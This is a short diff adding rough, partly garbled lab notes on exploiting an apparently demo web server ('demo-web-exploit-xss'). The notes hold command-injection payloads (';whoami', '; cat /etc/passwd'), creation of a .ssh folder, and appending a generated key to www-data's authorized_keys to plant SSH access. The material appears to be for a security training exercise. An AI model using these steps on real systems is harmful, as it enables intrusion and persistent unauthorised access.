@@ -18,3 +18,26 @@
   </pre>
   </BODY></HTML>
 ```
+
+Need place to upload, file to upload and ...
+# Upload copy of SSH RSA Token
+
+; whoami
+ 
+ ; cat /etc/passwd
+
+  ; mkdir /var/www/.ssh
+
+
+#  KLey Gen
+
+ssh-keygen -t rsa -b 4096
+
+
+# 
+
+paste sha ==student@lin-ops" >> /var/www/.ssh/authorized_keys
+
+
+www-data@demo-web-exploit-xss:
+
